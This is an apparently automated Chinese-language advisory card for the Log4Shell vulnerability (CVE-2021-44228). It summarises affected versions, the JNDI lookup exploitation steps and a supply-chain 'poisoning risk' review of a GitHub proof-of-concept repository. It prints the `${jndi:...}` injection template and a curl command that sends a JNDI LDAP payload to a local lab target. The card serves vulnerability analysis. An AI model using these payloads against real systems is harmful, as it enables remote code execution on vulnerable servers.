## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)